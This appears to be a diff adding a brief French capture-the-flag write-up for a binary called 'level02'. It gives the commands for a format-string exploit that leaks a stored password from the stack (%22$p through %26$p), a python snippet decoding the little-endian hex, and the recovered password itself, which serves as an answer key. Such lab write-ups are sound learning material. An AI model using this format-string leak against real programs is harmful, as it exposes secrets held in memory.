@@ -1,0 +1,21 @@
+Vulnérabilité format string dans le printf(format) final
+Trouver l'offset avec:
+
+python -c 'print "%x "*100' | ./level02
+
+Password stocké à rbp-0xa0, input à rbp-0x70
+
+
+Décalage = 48 bits
+Premier octet à position 22 (28 - 48/8)
+Password fait 40 chars = 5 x 8 octets
+
+
+Exploit:
+
+(echo '%22$p %23$p %24$p %25$p %26$p'; echo 'dummy') | ./level02
+
+Conversion hex vers ASCII avec inversion little-endian:
+
+print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])
+Résultat: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
